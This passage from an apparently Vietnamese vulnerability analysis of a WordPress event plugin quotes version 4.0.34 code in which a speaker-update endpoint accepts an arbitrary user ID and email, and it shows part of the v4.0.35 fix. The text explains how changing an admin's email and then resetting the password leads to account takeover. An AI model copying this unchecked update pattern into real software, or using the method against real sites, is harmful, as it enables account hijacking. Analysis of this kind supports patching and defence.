</span></span><span class="line hl"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">prepare_item_for_database</span><span class="p">(</span> <span class="nv">$request</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nx">is_wp_error</span><span class="p">(</span> <span class="nv">$data</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$speaker</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User_Model</span><span class="p">(</span> <span class="nv">$request</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$updated</span> <span class="o">=</span> <span class="nv">$speaker</span><span class="o">-&gt;</span><span class="na">update</span><span class="p">(</span> <span class="nv">$data</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line hl"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Mở rộng hoặc thu gọn khối mã" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>Hàm sẽ gọi đến <strong><code>prepare_item_for_database()</code></strong> để thực hiện các bước <strong>chuẩn bị dữ liệu cần thiết trước khi tiến hành thao tác tạo mới hoặc cập nhật</strong>.</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="SpeakerController.php v4.0.34" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">SpeakerController.php v4.0.34</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="hl"><span class="lnt"> 3
</span></span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="hl"><span class="lnt">10
</span></span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="hl"><span class="lnt">58
</span></span><span class="lnt">59
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">prepare_item_for_database</span><span class="p">(</span> <span class="nv">$request</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$prepared_data</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line hl"><span class="cl">    <span class="nv">$input_data</span>    <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_body</span><span class="p">(),</span> <span class="k">true</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$prepared_data</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">intval</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">        <span class="nv">$prepared_data</span><span class="p">[</span><span class="s1">&#39;etn_speaker_title&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">sanitize_text_field</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$prepared_data</span><span class="p">[</span><span class="s1">&#39;display_name&#39;</span><span class="p">]</span>      <span class="o">=</span> <span class="nx">sanitize_text_field</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$prepared_data</span><span class="p">[</span><span class="s1">&#39;etn_speaker_website_email&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">sanitize_text_field</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$prepared_data</span><span class="p">[</span><span class="s1">&#39;user_login&#39;</span><span class="p">]</span>                <span class="o">=</span> <span class="nx">sanitize_email</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;social&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$prepared_data</span><span class="p">[</span><span class="s1">&#39;etn_speaker_social&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;social&#39;</span><span class="p">]</span> <span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;category&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_array</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;category&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$allowed_categories</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;speaker&#39;</span><span class="p">,</span> <span class="s1">&#39;organizer&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$filtered_categories</span> <span class="o">=</span> <span class="nx">array_intersect</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;category&#39;</span><span class="p">],</span> <span class="nv">$allowed_categories</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$filtered_categories</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$prepared_data</span><span class="p">[</span><span class="s1">&#39;etn_speaker_category&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$filtered_categories</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">unset</span><span class="p">(</span> <span class="nv">$prepared_data</span><span class="p">[</span><span class="s1">&#39;etn_speaker_category&#39;</span><span class="p">]</span> <span class="p">);</span> <span class="c1">// Or you can leave it out entirely
</span></span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>       
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;speaker_group&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$prepared_data</span><span class="p">[</span><span class="s1">&#39;etn_speaker_group&#39;</span><span class="p">]</span> <span class="o">=</span>  <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;speaker_group&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;speaker_group&#39;</span><span class="p">])</span> <span class="o">:</span> <span class="nx">json_encode</span><span class="p">([]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>        
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="c1">//non mandatory field
</span></span></span><span class="line"><span class="cl">    <span class="nv">$prepared_data</span><span class="p">[</span><span class="s1">&#39;date&#39;</span><span class="p">]</span>                      <span class="o">=</span>  <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;date&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;date&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="nx">date</span><span class="p">(</span><span class="s2">&#34;Y-m-d H:i:s&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$prepared_data</span><span class="p">[</span><span class="s1">&#39;etn_speaker_designation&#39;</span><span class="p">]</span>   <span class="o">=</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;designation&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nx">sanitize_text_field</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;designation&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$prepared_data</span><span class="p">[</span><span class="s1">&#39;etn_company_name&#39;</span><span class="p">]</span>          <span class="o">=</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;company_name&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nx">sanitize_text_field</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;company_name&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$prepared_data</span><span class="p">[</span><span class="s1">&#39;etn_speaker_url&#39;</span><span class="p">]</span>           <span class="o">=</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;company_url&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nx">sanitize_url</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;company_url&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$prepared_data</span><span class="p">[</span><span class="s1">&#39;etn_speaker_summery&#39;</span><span class="p">]</span>       <span class="o">=</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;summary&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nx">wp_kses_post</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;summary&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$prepared_data</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">]</span>                     <span class="o">=</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nx">sanitize_url</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$prepared_data</span><span class="p">[</span><span class="s1">&#39;image_id&#39;</span><span class="p">]</span>                  <span class="o">=</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;image_id&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nx">intval</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;image_id&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">:</span> <span class="nx">attachment_url_to_postid</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$prepared_data</span><span class="p">[</span><span class="s1">&#39;etn_speaker_company_logo&#39;</span><span class="p">]</span>  <span class="o">=</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;company_logo&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nx">sanitize_url</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;company_logo&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$prepared_data</span><span class="p">[</span><span class="s1">&#39;etn_company_logo_id&#39;</span><span class="p">]</span>       <span class="o">=</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;company_logo_id&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nx">intval</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;company_logo_id&#39;</span><span class="p">]</span> <span class="p">)</span><span class="o">:</span> <span class="nx">attachment_url_to_postid</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;company_logo&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;hide_user&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$prepared_data</span><span class="p">[</span><span class="s1">&#39;hide_user&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$input_data</span><span class="p">[</span><span class="s1">&#39;hide_user&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line hl"><span class="cl">    <span class="k">return</span> <span class="nv">$prepared_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Mở rộng hoặc thu gọn khối mã" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>Hàm <strong><code>prepare_item_for_database()</code></strong> dùng để <strong>decode JSON từ body request, sanitize và chuẩn hóa dữ liệu, map các trường cần thiết sang cấu trúc nội bộ, sau đó trả về mảng dữ liệu để phục vụ việc tạo hoặc cập nhật speaker trong database</strong>.</p>
<p>Sau đó hàm <code>update_item</code> khởi tạo speaker theo <code>$request['id']</code></p>
<p>Gọi <code>$speaker-&gt;update($data)</code> để ghi dữ liệu đã chuẩn hóa vào database, cập nhật thông tin speaker.</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="user-model.php v4.0.34" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">user-model.php v4.0.34</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="hl"><span class="lnt"> 2
</span></span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="hl"><span class="lnt"> 9
</span></span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="hl"><span class="lnt">13
</span></span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">update</span><span class="p">(</span> <span class="nv">$args</span> <span class="o">=</span> <span class="p">[]</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nx">get_userdata</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$email</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$args</span><span class="p">[</span><span class="s1">&#39;etn_speaker_website_email&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$args</span><span class="p">[</span><span class="s1">&#39;etn_speaker_website_email&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$user_data</span> <span class="o">=</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">to_array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nv">$email</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">        <span class="nv">$user_data</span><span class="p">[</span><span class="s1">&#39;user_email&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$email</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line hl"><span class="cl">    <span class="nv">$user_id</span> <span class="o">=</span> <span class="nx">wp_update_user</span><span class="p">(</span> <span class="nv">$user_data</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$user_id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Mở rộng hoặc thu gọn khối mã" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>Hàm <strong><code>update()</code></strong> lấy thông tin user theo <strong>ID được truyền từ request</strong>, chuyển dữ liệu user sang mảng, sau đó <strong>ghi đè trường <code>user_email</code> nếu có giá trị mới</strong> và gọi <strong><code>wp_update_user()</code></strong> để cập nhật trực tiếp dữ liệu user trong hệ thống.</p>
<p>Do <strong>ID và email đều có thể bị kiểm soát từ request</strong>, toàn bộ luồng cập nhật có thể bị attacker lợi dụng để <strong>thay đổi email của bất kỳ user nào</strong>. Khi email của nạn nhân (ví dụ admin) bị đổi sang email do attacker kiểm soát, attacker chỉ cần thực hiện chức năng <strong>reset mật khẩu</strong> để <strong>chiếm quyền tài khoản (Account Takeover)</strong>, từ đó dẫn đến <strong>Privilege Escalation</strong>.</p>
<p>Bản vá <code>v4.0.35</code> bổ sung các kiểm soát sau trong hàm <code>update_item</code>:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="SpeakerController.php v4.0.34" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">SpeakerController.php v4.0.34</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$target_user_id</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_param</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$target_user</span>    <span class="o">=</span> <span class="nx">get_userdata</span><span class="p">(</span><span class="nv">$target_user_id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Validate user tồn tại
</span></span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$target_user</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">new</span> <span class="nx">WP_Error</span><span class="p">(</span><span class="s1">&#39;user_not_found&#39;</span><span class="p">,</span> <span class="s1">&#39;User does not exist&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;status&#39;</span> <span class="o">=&gt;</span> <span class="mi">404</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Kiểm tra quyền chỉnh sửa user
</span></span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">current_user_can</span><span class="p">(</span> <span class="s1">&#39;edit_user&#39;</span><span class="p">,</span> <span class="nv">$target_user_id</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">new</span> <span class="nx">WP_Error</span><span class="p">(</span><span class="s1">&#39;forbidden&#39;</span><span class="p">,</span> <span class="s1">&#39;forbidden&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;status&#39;</span> <span class="o">=&gt;</span> <span class="mi">403</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Chỉ cho phép chỉnh sửa speaker / organizer
</span></span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="o">!</span> <span class="nx">in_array</span><span class="p">(</span><span class="s1">&#39;etn-speaker&#39;</span><span class="p">,</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span> <span class="nv">$target_user</span><span class="o">-&gt;</span><span class="na">roles</span><span class="p">,</span> <span class="k">true</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">    <span class="o">!</span> <span class="nx">in_array</span><span class="p">(</span><span class="s1">&#39;etn-organizer&#39;</span><span class="p">,</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span> <span class="nv">$target_user</span><span class="o">-&gt;</span><span class="na">roles</span><span class="p">,</span> <span class="k">true</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">new</span> <span class="nx">WP_Error</span><span class="p">(</span><span class="s1">&#39;forbidden&#39;</span><span class="p">,</span> <span class="s1">&#39;forbidden&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;status&#39;</span> <span class="o">=&gt;</span> <span class="mi">403</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Chặn cập nhật các role nhạy cảm
</span></span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span>
